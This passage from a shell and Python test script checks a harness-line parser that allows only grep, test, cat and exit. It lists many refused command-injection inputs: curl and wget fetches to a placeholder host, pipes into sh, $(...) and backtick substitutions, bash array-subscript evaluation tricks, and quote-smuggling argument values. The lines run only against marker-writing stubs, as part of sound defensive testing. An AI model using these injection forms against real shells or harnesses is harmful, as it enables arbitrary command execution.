        while c and c[0][2] == "bare" and c[0][1] in W["negation"]: c = c[1:]
        if not c: raise Refused("an empty command")
        word, kind, rest = c[0][1], c[0][2], c[1:]
        if kind != "bare" or word not in W["commands"]: raise Refused(f"the command word {word!r} is not in commands (unquoted)")
        if k and seps[k - 1] == "|" and word not in W["pipe_into"]: raise Refused(f"a pipe into {word!r} (pipe_into)")
        if word == "grep":                                 # grep OPTION... -- PATTERN ["$N"...], each word in its role
            i = 0
            while i < len(rest) and rest[i][2] == "bare" and rest[i][1] in W["grep_options"]: i += 1
            if W["end_of_options"]:
                if i >= len(rest) or rest[i][2] != "bare" or rest[i][1] != W["end_of_options"]:
                    raise Refused(f"grep needs its options from grep_options, then {W['end_of_options']} before the pattern (a quoted word is never an option)")
                i += 1
            if i >= len(rest): raise Refused("grep has no pattern")
            p = rest[i]
            if not ((p[2] == "bare" and p[1] in W["grep_bare_patterns"]) or (p[2] == "dq" and not (W["pattern_first_char_not"] and p[1][1:].startswith(W["pattern_first_char_not"])))):
                raise Refused(f"the grep pattern {p[1]!r} is not a double-quoted word that does not start with {W['pattern_first_char_not']!r}, or a bare pattern from grep_bare_patterns")
            for a in rest[i + 1:]:
                if a[2] != "pos": raise Refused(f"the grep file operand {a[1]!r} is not a positional \"$N\"")
        elif word == "test": test_expr(rest)
        elif word == "[":
            if not rest or rest[-1][2] != "bare" or rest[-1][1] != "]": raise Refused("[ without its closing ]")
            test_expr(rest[:-1])
        elif word == "cat":                                # cat -- "$N"
            want = ([("bare", W["end_of_options"])] if W["end_of_options"] else []) + [("pos",)]
            if len(rest) != len(want) or any(a[2] != w[0] or (w[0] == "bare" and a[1] != w[1]) for a, w in zip(rest, want)):
                raise Refused(f"cat takes exactly {W['end_of_options'] + ' ' if W['end_of_options'] else ''}and one positional")
        elif word == "exit":
            if len(rest) != 1 or rest[0][2] != "bare" or rest[0][1] not in W["exit_status"]: raise Refused("exit takes exactly one exit_status")
        else:
            for a in rest:
                if a[2] not in ("dq", "pos"): raise Refused(f"the argument {a[1]!r} is not a double-quoted word or a positional")
def main():
    try:
        judge(open(sys.argv[2], encoding="utf-8", errors="surrogateescape", newline="").read() if sys.argv[1] == "--file" else sys.argv[1])
    except Refused as e:
        print("refused: " + str(e)); sys.exit(1)
    print("harness assertion: runs nothing but grep, test, cat and exit <digit>"); sys.exit(0)
if __name__ == "__main__":
    main()
PY
hf() { rc=0; python3 "$work/harness_form.py" "$1" >"$work/hf.out" 2>&1 || rc=$?; }
hff() { rc=0; python3 "$work/harness_form.py" --file "$1" >"$work/hf.out" 2>&1 || rc=$?; }
cat >"$work/hf-refused.tsv" <<'EOF'
a pipe into sh	t "r" "x" bash -c 'grep -q a "$1" | sh' _ "$CALLS"
a pipe into bash	t "r" "x" bash -c 'cat "$1" | bash' _ "$CALLS"
an output redirection >	t "r" "x" bash -c 'grep a "$1" > out' _ "$CALLS"
an output redirection >>	t "r" "x" bash -c 'grep a "$1" >> out' _ "$CALLS"
an input redirection <	t "r" "x" bash -c 'grep a < "$1"' _ "$CALLS"
$(curl ...) in the body	t "r" "x" bash -c 'test "$(curl -s https://e.example/x)" = 1' _
$(...) of another command in the body	t "r" "x" bash -c 'test "$(ls)" = 1' _
an unquoted $(grep -c ...) in the body	t "r" "x" bash -c 'test $(grep -c a "$1") -ge 1' _ "$CALLS"
a pipe inside $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c a "$1" | sh)" -ge 1' _ "$CALLS"
a substitution inside $(cat ...)	t "r" "x" bash -c 'test "$(cat $(curl -s https://e.example/x))" = 1' _
$(cat ...) of a literal path, not a positional argument	t "r" "x" bash -c 'test "$(cat f)" = 1' _
$(grep -c ...) on a literal path, not a positional argument	t "r" "x" bash -c 'test "$(grep -c a f)" -ge 1' _
a process substitution in the body	t "r" "x" bash -c 'grep a <(cat "$1")' _ "$CALLS"
a substitution the outer shell runs, in the title	t "r" "x $(curl -s https://e.example/x)" bash -c 'grep a "$1"' _ "$CALLS"
a substitution the outer shell runs, in the rule label	t "r $(curl -s https://e.example/x)" "x" bash -c 'grep a "$1"' _ "$CALLS"
a substitution the outer shell runs, in an argument	t "r" "x" bash -c 'grep a "$1"' _ "$(curl -s https://e.example/x)"
backticks in the body	t "r" "x" bash -c 'test "`curl -s https://e.example/x`" = 1' _
backticks in the title	t "r" "x `curl -s https://e.example/x`" bash -c 'grep a "$1"' _ "$CALLS"
a command word outside the vocabulary (curl)	t "r" "x" bash -c 'curl -s https://e.example/x' _
a quoted command word	t "r" "x" bash -c '"grep" a "$1"' _ "$CALLS"
a variable as the command word	t "r" "x" bash -c '$G a "$1"' _ "$CALLS"
a positional argument as the command word	t "r" "x" bash -c '"$1" a' _ "$CALLS"
eval	t "r" "x" bash -c 'eval "grep a f"' _
source	t "r" "x" bash -c 'source "$1"' _ "$CALLS"
a second bash -c	t "r" "x" bash -c 'bash -c "grep a f"' _
a ;-separated extra command (wget)	t "r" "x" bash -c 'grep a "$1"; wget https://e.example/x' _ "$CALLS"
exit with a variable status	t "r" "x" bash -c 'grep a "$1" && exit $x' _ "$CALLS"
exit with a positional status	t "r" "x" bash -c 'grep a "$1" && exit "$1"' _ "$CALLS"
exit with no status	t "r" "x" bash -c 'grep a "$1" && exit' _ "$CALLS"
exit with two arguments	t "r" "x" bash -c 'grep a "$1" && exit 1 2' _ "$CALLS"
exit with a negative status	t "r" "x" bash -c 'grep a "$1" && exit -1' _ "$CALLS"
exit with two digits	t "r" "x" bash -c 'grep a "$1" && exit 10' _ "$CALLS"
exit with a quoted status	t "r" "x" bash -c 'grep a "$1" && exit "1"' _ "$CALLS"
a quoted exit	t "r" "x" bash -c 'grep a "$1" && "exit" 1' _ "$CALLS"
a background &	t "r" "x" bash -c 'grep a "$1" & curl https://e.example/x' _ "$CALLS"
a subshell	t "r" "x" bash -c '(curl https://e.example/x)' _
cat with an option	t "r" "x" bash -c 'cat -v "$1"' _ "$CALLS"
cat of two files	t "r" "x" bash -c 'cat "$1" "$1"' _ "$CALLS"
a pipe into anything but grep (tee)	t "r" "x" bash -c 'cat "$1" | tee g' _ "$CALLS"
not the t function	run "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
an unquoted title	t "r" x bash -c 'grep a "$1"' _ "$CALLS"
no rule label	t "x" bash -c 'grep a "$1"' _ "$CALLS"
an empty command between operators	t "r" "x" bash -c 'grep a "$1" && && grep b "$1"' _ "$CALLS"
Codex R1 reproduction: a DOUBLE-quoted body with an outer variable (its value is spliced into the code)	t "r" "x" bash -c "grep -q a '$CALLS'"
a double-quoted body even with no variable	t "r" "x" bash -c "grep -q a f" _
no _ after the body	t "r" "x" bash -c 'grep a "$1"' "$CALLS"
a $0 other than _	t "r" "x" bash -c 'grep a "$1"' x "$CALLS"
an unquoted word after the body	t "r" "x" bash -c 'grep a "$1"' _ curl
a second body after the arguments	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS" bash -c 'curl https://e.example/x'
an argument variable outside the allowlist	t "r" "x" bash -c 'grep a "$1"' _ "$HOME"
an argument with two variables	t "r" "x" bash -c 'grep a "$1"' _ "$work$CALLS"
an argument written ${work}	t "r" "x" bash -c 'grep a "$1"' _ "${work}/rc"
an argument with a variable in the path	t "r" "x" bash -c 'grep a "$1"' _ "$work/$x"
an argument with a glob	t "r" "x" bash -c 'grep a "$1"' _ "$work/*"
a single-quoted argument	t "r" "x" bash -c 'grep a "$1"' _ '$CALLS'
an unquoted argument	t "r" "x" bash -c 'grep a "$1"' _ $CALLS
a literal argument	t "r" "x" bash -c 'grep a "$1"' _ "f"
a positional beyond the arguments	t "r" "x" bash -c 'grep a "$2"' _ "$CALLS"
an unquoted positional	t "r" "x" bash -c 'grep a $1' _ "$CALLS"
"$@" in the body	t "r" "x" bash -c 'grep a "$@"' _ "$CALLS"
"${1}" in the body	t "r" "x" bash -c 'grep a "${1}"' _ "$CALLS"
"$10" in the body	t "r" "x" bash -c 'grep a "$10"' _ "$CALLS"
a positional inside a longer word	t "r" "x" bash -c 'grep a "$1/x"' _ "$CALLS"
a positional glued to another word	t "r" "x" bash -c 'grep a "$1"x' _ "$CALLS"
an inner variable in a double-quoted word	t "r" "x" bash -c 'grep "$HOME" "$1"' _ "$CALLS"
an escaped quote in a double-quoted word	t "r" "x" bash -c 'grep "a\"b" "$1"' _ "$CALLS"
an escaped dollar in a double-quoted word	t "r" "x" bash -c 'grep "a\$b" "$1"' _ "$CALLS"
an unquoted backslash	t "r" "x" bash -c 'grep a\ b "$1"' _ "$CALLS"
Sonnet R1 reproduction 2 (new form): test -v with a literal $(...) array subscript (bash 5 evaluates it)	t "r" "x" bash -c 'test -v "a[\$(curl -s https://e.example/x)]"' _
test -v "a[$(touch X)]" (the substitution runs at expansion)	t "r" "x" bash -c 'test -v "a[$(touch X)]"' _
test -v on a positional argument (its value would be the subscript)	t "r" "x" bash -c 'test -v "$1"' _ "$CALLS"
[ -v "x[$(cmd)]" ]	t "r" "x" bash -c '[ -v "x[$(cmd)]" ]' _
[ -R "x[$(cmd)]" ]	t "r" "x" bash -c '[ -R "x[$(cmd)]" ]' _
-eq with an array-subscript operand	t "r" "x" bash -c '[ "$(cat "$1")" -eq "a[$(cmd)]" ]' _ "$CALLS"
-ge with a positional operand	t "r" "x" bash -c 'test "$1" -ge 0' _ "$CALLS"
a backtick inside a double-quoted pattern	t "r" "x" bash -c 'grep "a`curl -s https://e.example/x`" "$1"' _ "$CALLS"
${x} in a double-quoted pattern	t "r" "x" bash -c 'grep "${x}" "$1"' _ "$CALLS"
${x} unquoted	t "r" "x" bash -c 'grep ${x} "$1"' _ "$CALLS"
$((1+1))	t "r" "x" bash -c 'test $((1+1)) = 2' _
$( inside a grep -c pattern	t "r" "x" bash -c 'test "$(grep -c "a$(curl -s https://e.example/x)" "$1")" -ge 1' _ "$CALLS"
an arithmetic comparison on $(cat ...) (the file's text would be the expression)	t "r" "x" bash -c 'test "$(cat "$1")" -eq 0' _ "$work/evil"
an arithmetic comparison on a quoted word	t "r" "x" bash -c 'test "a" -eq 0' _
an arithmetic comparison on a bare word (a variable name)	t "r" "x" bash -c 'test a -eq 0' _
an arithmetic comparison on an inner variable	t "r" "x" bash -c 'test $x -eq 0' _
test -n	t "r" "x" bash -c 'test -n "$1"' _ "$CALLS"
test -z	t "r" "x" bash -c '[ -z "$1" ]' _ "$CALLS"
test -a (and)	t "r" "x" bash -c 'test -f "$1" -a -f "$1"' _ "$CALLS"
test -o (an option name)	t "r" "x" bash -c 'test -o errexit' _
test with one operand	t "r" "x" bash -c 'test a' _
test with four operands	t "r" "x" bash -c 'test a = b c' _
an operator outside the set (-nt)	t "r" "x" bash -c 'test "$1" -nt "$1"' _ "$CALLS"
a quoted operator	t "r" "x" bash -c 'test a "=" b' _
a quoted unary operator	t "r" "x" bash -c 'test "-f" "$1"' _ "$CALLS"
$[ ] legacy arithmetic	t "r" "x" bash -c 'test $[1+1] = 2' _
$[ ] on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $[A] = 1' _
$(( )) on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $((A)) = 1' _
(( )) arithmetic command	t "r" "x" bash -c 'A=a[\$(cmd)]; ((A))' _
let	t "r" "x" bash -c 'A=a[\$(cmd)]; let A' _
declare -i	t "r" "x" bash -c 'declare -i A; A=a[\$(cmd)]' _
typeset -i	t "r" "x" bash -c 'typeset -i A; A=a[\$(cmd)]' _
local (inside a function)	t "r" "x" bash -c 'f() { local -i A=a[\$(cmd)]; }; f' _
printf -v with a subscript	t "r" "x" bash -c 'printf -v a[\$(cmd)] x' _
read into a subscript	t "r" "x" bash -c 'read a[\$(cmd)] <<< x' _
eval of a word	t "r" "x" bash -c 'eval cmd' _
. (dot) source	t "r" "x" bash -c '. "$1"' _ "$work/f"
an array-subscript assignment	t "r" "x" bash -c 'a[\$(cmd)]=1' _
an array subscript as a test operand	t "r" "x" bash -c 'test a[1] = 1' _
indirect ${!x}	t "r" "x" bash -c 'x=a[\$(cmd)]; test "${!x}" = 1' _
$'...' ANSI-C quotes	t "r" "x" bash -c 'grep $'"'"'\x61'"'"' "$1"' _ "$CALLS"
<( ) process substitution as a grep file	t "r" "x" bash -c 'grep "a" <(cmd)' _
>( ) process substitution	t "r" "x" bash -c 'grep "a" "$1" > >(cmd)' _ "$CALLS"
{a,b} brace expansion in command position	t "r" "x" bash -c '{cmd,x}' _
a glob in command position	t "r" "x" bash -c 'cm?' _
a bracket glob in command position	t "r" "x" bash -c '[c]md' _
a glob as a test operand	t "r" "x" bash -c 'test -f *' _
a glob as a grep pattern	t "r" "x" bash -c 'grep * "$1"' _ "$CALLS"
a here-string <<<	t "r" "x" bash -c 'grep "a" <<< "$1"' _ "$CALLS"
an unquoted grep pattern word	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
$ in the title	t "r" "x $u" bash -c 'grep -q . "$1"' _ "$CALLS"
$[ ] in the title	t "r" "$[1+1]" bash -c 'grep -q . "$1"' _ "$CALLS"
$(( )) in the title	t "r" "$((1+1))" bash -c 'grep -q . "$1"' _ "$CALLS"
${!x} in the rule label	t "r ${!x}" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
$ in the rule label	t "r $x" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
a backslash in the title	t "r" "x \$y" bash -c 'grep -q . "$1"' _ "$CALLS"
an array subscript in an argument path	t "r" "x" bash -c 'grep -q . "$1"' _ "$work/a[1]"
$(( )) in an argument	t "r" "x" bash -c 'grep -q . "$1"' _ "$((1))"
more ARGs than max_args (ten)	t "r" "x" bash -c 'grep -q . "$1"' _ "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS"
grep -vq as one word (the whitelist lists -v and -q, one option per word)	t "r" "x" bash -c 'grep -vq "a" "$1"' _ "$CALLS"
Codex R3 reproduction: a double-quoted --file=... read as a grep OPTION	t "r" "x" bash -c 'grep "--file=/etc/hosts" "$1"' _ "$CALLS"
Codex R3 reproduction: the same inside the count substitution	t "r" "x" bash -c 'test "$(grep -c "--file=/etc/hosts" "$1")" -ge 1' _ "$CALLS"
Sonnet B1: a double-quoted --version	t "r" "x" bash -c 'grep "--version" "$1"' _ "$CALLS"
Sonnet B1: a double-quoted --pager=... in the count substitution	t "r" "x" bash -c 'test "$(grep -c "--pager=touch M" "$1")" -ge 1' _ "$CALLS"
a double-quoted -f	t "r" "x" bash -c 'grep "-f" -- "a" "$1"' _ "$CALLS"
a double-quoted --file=x before --	t "r" "x" bash -c 'grep "--file=x" -- "a" "$1"' _ "$CALLS"
a double-quoted -e with a pattern	t "r" "x" bash -c 'grep "-e" "pat" "$1"' _ "$CALLS"
--regexp=x as the pattern after --	t "r" "x" bash -c 'grep -- "--regexp=x" "$1"' _ "$CALLS"
a double-quoted -r	t "r" "x" bash -c 'grep "-r" -- "a" "$1"' _ "$CALLS"
a double-quoted -E	t "r" "x" bash -c 'grep "-E" -- "a" "$1"' _ "$CALLS"
a pattern that starts with - (even after --)	t "r" "x" bash -c 'grep -- "-a" "$1"' _ "$CALLS"
grep without -- before the pattern	t "r" "x" bash -c 'grep -q "a" "$1"' _ "$CALLS"
grep without -- in the count substitution	t "r" "x" bash -c 'test "$(grep -c "a" "$1")" -ge 1' _ "$CALLS"
-- placed after the pattern	t "r" "x" bash -c 'grep "a" -- "$1"' _ "$CALLS"
a literal file operand	t "r" "x" bash -c 'grep -- "a" "f"' _ "$CALLS"
a second pattern word	t "r" "x" bash -c 'grep -- "a" "b" "$1"' _ "$CALLS"
cat without --	t "r" "x" bash -c 'test "$(cat "$1")" = "a"' _ "$CALLS"
cat -- with a literal operand	t "r" "x" bash -c 'test "$(cat -- "f")" = "a"' _ "$CALLS"
an option after --	t "r" "x" bash -c 'grep -- -v "a" "$1"' _ "$CALLS"
Codex R6: a literal path as a file-test operand	t "r" "x" bash -c 'test -f "/etc/passwd"' _
Codex R6: a cat substitution as a file-test operand	t "r" "x" bash -c 'test -s "$(cat -- "$1")"' _ "$CALLS"
a grep count substitution as a file-test operand	t "r" "x" bash -c '[ -e "$(grep -c -- "a" "$1")" ]' _ "$CALLS"
a double-quoted word as a file-test operand	t "r" "x" bash -c 'test -d "x"' _
a bare number as a file-test operand	t "r" "x" bash -c 'test -r 1' _
a file test with an extra argument	t "r" "x" bash -c 'test -e "$1" x' _ "$CALLS"
a file test on a positional beyond the arguments	t "r" "x" bash -c 'test -f "$2"' _ "$CALLS"
Sonnet R6: cat with two operands	t "r" "x" bash -c 'test "$(cat -- "$1" "$2")" = "a"' _ "$CALLS" "$CALLS"
Sonnet R6: cat with an extra word as a command	t "r" "x" bash -c 'cat -- "$1" EXTRA' _ "$CALLS"
cat with two positionals as a command	t "r" "x" bash -c 'cat -- "$1" "$2"' _ "$CALLS" "$CALLS"
EOF
while IFS=$'\t' read -r what line; do
  hf "$line"
  CASE="AC16 harness form: refused ($what): exit 1, says refused"
  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
done <"$work/hf-refused.tsv"
# characters bash reads differently from the parser: anything outside space, tab and printable ASCII (Sonnet R1 reproduction 1: a literal newline in the body)
python3 - "$work" <<'PY'
import sys
w = sys.argv[1]
B = 't "r" "x" bash -c \'grep a "$1"\' _ "$CALLS"'
cases = [
    ("Sonnet R1 reproduction 1: a literal newline in the body (bash runs the text after it as a second command)", 't "r" "x" bash -c \'grep a "$1"\ncurl -s https://e.example/x\' _ "$CALLS"'),
    ("a literal newline in the title", B.replace('"x"', '"x\ny"')),
    ("a literal newline in the rule label", B.replace('"r"', '"r\ns"')),
    ("a literal newline after the arguments", B + "\ncurl -s https://e.example/x"),
    ("a carriage return in the body", 't "r" "x" bash -c \'grep a "$1"\rcurl -s https://e.example/x\' _ "$CALLS"'),
    ("a control character (0x01) in the body", B.replace("grep a", "grep a\x01")),
    ("an escape (0x1b) in the title", B.replace('"x"', '"x\x1b[0m"')),
    ("a vertical tab in the body", B.replace("grep a", "grep a\x0bcurl")),
    ("a form feed in the body", B.replace("grep a", "grep a\x0c")),
    ("DEL (0x7f) in the body", B.replace("grep a", "grep a\x7f")),
    ("a non-ASCII letter in the title", B.replace('"x"', '"café"')),
    ("a non-breaking space in the body", B.replace("grep a", "grep a")),
]
for i, (what, line) in enumerate(cases):
    open("%s/ctl-%02d.txt" % (w, i), "w", encoding="utf-8", newline="").write(line)
    open("%s/ctl-%02d.what" % (w, i), "w").write(what)
PY
for f in "$work"/ctl-*.txt; do
  hff "$f"
  CASE="AC16 harness form: refused ($(cat "${f%.txt}.what")): exit 1, says refused"
  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
done
cat >"$work/hf-accepted.tsv" <<'EOF'
the whole vocabulary	t "r" "x" bash -c 'grep -q -- "a" "$1" && ! grep -E -- "b|c" "$1" || test "$(grep -c -- "a" "$1")" -ge 3; [ "$(cat -- "$1")" = 2 ] | grep -q -- .' _ "$CALLS"
exit with one literal digit	t "r" "x" bash -c 'grep -- "a" "$1" | grep -v -q -- "b" && exit 1; exit 0' _ "$CALLS"
the file tests -f -s -e -d -r and !	t "r" "x" bash -c 'test -f "$1" && [ -s "$1" ] && test -e "$1" && ! test -d "$1" && test ! -d "$1" && [ -r "$1" ]' _ "$CALLS"
string = and != on $(cat -- ...)	t "r" "x" bash -c 'test "$(cat -- "$1")" != "b" && [ "$(cat -- "$2")" = "a" ]' _ "$work/rc" "$CALLS"
arithmetic on digits and on $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c -E -- "a" "$1")" -eq 1 && [ 3 -ne 4 ] && test 1 -lt 2 && test 2 -le 2 && test 3 -gt 2' _ "$CALLS"
escaped dot and brackets in a pattern	t "r" "x" bash -c 'grep -Eq -- "\[a\.b\]" "$1"' _ "$CALLS"
a pattern whose first character is a space, then a dash	t "r" "x" bash -c 'grep -q -- " -x" "$1"' _ "$CALLS"
no argument after _	t "r" "x" bash -c 'test 1 -eq 1' _
synthetic, the HTTPS-check shape: no unknown field, one flag with its value, no second flag, a count	t "rule 9" "synthetic: every call has the flag --alpha with the value =beta, once, and no plain http address" bash -c 'grep -q -- " unk:\[" "$1" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -v -q -- " opt:\[--alpha\] val:\[=beta\]" && exit 1; grep -Eq -- " opt:\[--alpha\] .* opt:\[--alpha\]| url:\[http://" "$1" && exit 1; test "$(grep -c -- "^argv \[tool\]" "$1")" -ge 3' _ "$work/argv"
synthetic, the cap-check shape: selected calls, a positive whole-number value, a count	t "rule 9" "synthetic: every selected call has a positive cap" bash -c 'grep -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1" | grep -v -Eq -- " opt:\[--cap\] val:\[(1|2|3|4|5|6|7|8|9)(0|1|2|3|4|5|6|7|8|9)*\]" && exit 1; test "$(grep -c -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1")" -ge 1' _ "$work/argv"
synthetic, the status-file shape: an exit status, an existing log, no selected call	t "rule 9" "synthetic: status 2, the log exists and holds no selected call" bash -c 'test "$(cat -- "$1")" = 2 && test -f "$2" && ! grep -q -E -- " url:\[https://example\.invalid/(a.b|cd)/" "$2"' _ "$work/rc" "$work/argv"
synthetic, the first-field shape: a required first field and no redirect flag in any letter group	t "rule 9" "synthetic: every call starts with opt -q and none has -L" bash -c 'grep -- "^argv \[tool\]" "$1" | grep -v -q -- "^argv \[tool\] opt:\[-q\]" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -Eq -- " opt:\[-(f|s|S|g|q)*L(f|s|S|g|q|o|m)*\]| opt:\[--location\]" && exit 1; test "$(grep -c -- "^argv \[tool\] opt:\[-q\]" "$1")" -ge 3' _ "$work/argv"
a file test on a positional ($1 or $2)	t "r" "x" bash -c 'test -f "$1" && [ -s "$2" ] && ! test -d "$2"' _ "$work/rc" "$CALLS"
EOF
while IFS=$'\t' read -r what line; do
  hf "$line"
  CASE="AC16 harness form: accepted ($what): exit 0"
  check test "$rc" -eq 0; check grep -q '^harness assertion' "$work/hf.out"
done <"$work/hf-accepted.tsv"
# the distinct lines of the committed rows for bin/refresh-inputs-test.sh (the final P3 tree): the harness lines among them must be accepted, and all of them run in the runtime proof
cat >"$work/hf-real.txt" <<'EOF'
printf -v FETCH %s curl
EOF
while IFS= read -r line; do
  case "$line" in t\ *) hf "$line"; CASE="AC16 harness form: accepted (the committed row line ${line:0:60}...): exit 0"; check test "$rc" -eq 0;; esac
done <"$work/hf-real.txt"
CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh (by whole-line hash)"
check python3 - "$work/hf-real.txt" "$root/.github/supply-chain-exceptions.json" <<'PY'
import hashlib, json, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
real = {H(" ".join(l.split())) for l in open(sys.argv[1]).read().split("\n") if l}
rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] == "bin/refresh-inputs-test.sh"}
assert real == rows, (sorted(real ^ rows))
PY
# --- RUNTIME proof (Sonnet R1): every corpus line is EXECUTED under every bash on PATH (one per version: bash 5, whose test -v / -R / arithmetic operands
# evaluate $(...) even in single quotes, and, where present, an older bash such as 3.2), with a stub directory first on PATH whose curl, wget, touch, cmd and
# ls only write a marker file; the inner bash is the same shell. Then: every line that wrote the marker was refused by the parser, the planted reproductions
# did write it (the harness detects a run), and every accepted line (the corpus and the committed real lines) ran and wrote nothing, with plain paths and
# with quote-, substitution- and subscript-carrying argument values.
cat >"$work/hf_run.py" <<'PY'
import json, os, subprocess, sys, tempfile
hfpy, w = sys.argv[1], sys.argv[2]
def shells():                                              # every bash on PATH, one per version: bash 5 (the reproductions) and, where present, an older one (3.2)
    seen, out = set(), []
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = os.path.join(d, "bash")
        if d and os.access(p, os.X_OK):
            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
            v = r.stdout.strip()
            if r.returncode == 0 and v and v not in seen:
                seen.add(v); out.append((p, v))
    return out
SH = shells()
b5 = next((p for p, v in SH if int(v.split(".")[0]) >= 5), None)
corpus = []
for kind, name in (("refused", "hf-refused.tsv"), ("accepted", "hf-accepted.tsv")):
    for l in open(os.path.join(w, name)).read().split("\n"):
        if l:
            what, line = l.split("\t", 1); corpus.append((kind, what, line))
for l in open(os.path.join(w, "hf-real.txt")).read().split("\n"):
    if l:
        corpus.append(("real", l[:60], l))
for f in sorted(os.listdir(w)):
    if f.startswith("ctl-") and f.endswith(".txt"):
        corpus.append(("refused", open(os.path.join(w, f[:-4] + ".what")).read(), open(os.path.join(w, f), encoding="utf-8", newline="").read()))
# argument values that would add a command if the outer shell spliced them into code (Codex R1): the accepted form passes them as data only
HOSTILE = ["x'; curl -s https://e.example/x; #", 'x"; curl -s https://e.example/x; #', "$(curl -s https://e.example/x)", "a[$(curl -s https://e.example/x)]",
           "`curl -s https://e.example/x`"]
out = {"bash5": b5, "shells": [v for _, v in SH], "hostile": HOSTILE, "lines": []}
if b5:
    for kind, what, line in corpus:
        marks = {}
        for sh, ver in SH:
            d = tempfile.mkdtemp(dir=w, prefix="hfrun.")
            st = os.path.join(d, "stubs"); os.mkdir(st)
            mark = os.path.join(d, "marker")
            for n in ("curl", "wget", "touch", "cmd", "ls"):
                p = os.path.join(st, n); open(p, "w").write("#!%s\necho \"$0 $*\" >>\"$MARK\"\n" % sh); os.chmod(p, 0o755)
            p = os.path.join(st, "bash"); open(p, "w").write("#!%s\nexec %s \"$@\"\n" % (sh, sh)); os.chmod(p, 0o755)
            for n, t in (("f", "a\n"), ("g", "b\n"), ("rc", "0\n"), ("calls", "curl --proto =https --tlsv1.2 -g --max-filesize 1 --max-time 1 x\n"),
                         ("evil", "a[$(curl -s https://e.example/x)]\n")):
                open(os.path.join(d, n), "w").write(t)
            def run(work, calls, u):
                if os.path.exists(mark): os.remove(mark)
                env = {"PATH": st + os.pathsep + os.environ["PATH"], "HOME": d, "MARK": mark, "work": work, "CALLS": calls, "u": u, "LC_ALL": "C"}
                try:
                    subprocess.run([sh, "-c", 't() { shift 2; "$@"; }\n' + line], cwd=d, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=20)
                except subprocess.TimeoutExpired:
                    pass
                return os.path.exists(mark)
            marks[ver] = {"plain": run(d, os.path.join(d, "calls"), "x"), "hostile": [h for h in HOSTILE if run(h, h, h)]}
        verdict = subprocess.run([sys.executable, hfpy, line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
        out["lines"].append({"kind": kind, "what": what, "marked": any(m["plain"] for m in marks.values()),
                             "marked_hostile": sorted({h for m in marks.values() for h in m["hostile"]}), "by_shell": marks,
                             "refused": verdict.returncode == 1 and verdict.stdout.startswith("refused: "),
                             "accepted": verdict.returncode == 0 and verdict.stdout.startswith("harness assertion")})
json.dump(out, open(os.path.join(w, "hf-run.json"), "w"), indent=1)
PY
python3 "$work/hf_run.py" "$work/harness_form.py" "$work" </dev/null
hfr() { python3 - "$work/hf-run.json" "$1" <<'PY'
import json, sys
r = json.load(open(sys.argv[1])); L = r["lines"]; m = sys.argv[2]
assert r["bash5"], "no bash 5 on PATH"
if m == "marked-refused": bad = [x["what"] for x in L if (x["marked"] or x["marked_hostile"]) and not x["refused"]]
elif m == "accepted-clean": bad = [x["what"] for x in L if (x["kind"] in ("accepted", "real")) and (x["marked"] or x["marked_hostile"] or not x["accepted"] and x["kind"] == "accepted")]; assert sum(x["kind"] == "real" for x in L) == sum(1 for l in open(sys.argv[1].replace("hf-run.json", "hf-real.txt")) if l.strip())
elif m == "repros-mark":
    bad = [x["what"] for x in L if x["what"].startswith(("Sonnet R1 reproduction", "test -v \"a[$(touch X)]\"", "[ -v \"x[$(cmd)]\" ]")) and not x["marked"]]
    bad += [x["what"] for x in L if x["what"].startswith("Codex R1 reproduction") and not x["marked_hostile"]]
    assert sum(x["what"].startswith(("Sonnet R1 reproduction", "Codex R1 reproduction")) for x in L) == 3
print(sum(bool(x["marked"] or x["marked_hostile"]) for x in L), "of", len(L), "corpus lines wrote the marker (plain or hostile argument values); bad:", bad)
assert not bad, bad
PY
}
CASE="AC16 harness runtime: a bash of version 5 or newer is on PATH (the runtime proof needs it)"
check python3 -c "import json,sys; assert json.load(open(sys.argv[1]))['bash5']" "$work/hf-run.json"
CASE="AC16 harness runtime: the planted reproductions (newline in the body, test -v / [ -v with a \$(...) subscript; Codex: a double-quoted body run with a quote-carrying \$CALLS) DO write the marker under bash 5: the harness detects a run"
check hfr repros-mark
CASE="AC16 harness runtime: every corpus line that wrote the marker when run is refused by the parser"
check hfr marked-refused
CASE="AC16 harness runtime: every accepted line (the corpus and every distinct committed real line) runs under bash 5 and writes no marker, with plain paths AND with \$work, \$CALLS and \$u set to quote-, substitution- and subscript-carrying values"
check hfr accepted-clean
hfr marked-refused >"$work/hf-run.summary" 2>&1 || true; cat "$work/hf-run.summary"
CASE="AC16 harness runtime: the shells the corpus ran under are reported (one per bash version on PATH)"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('shells:', r['shells']); assert r['shells']" "$work/hf-run.json"
python3 -c "import json,sys; print('harness runtime shells:', json.load(open(sys.argv[1]))['shells'])" "$work/hf-run.json"
# --- COMPLEMENT enumeration: every token class outside HARNESS_WHITELIST (every character, every bash keyword and builtin, external commands, every test
# operator, grep options, every variable name bash lists plus the specials and near-misses of work / CALLS) in every position it can take (RULE, TITLE,
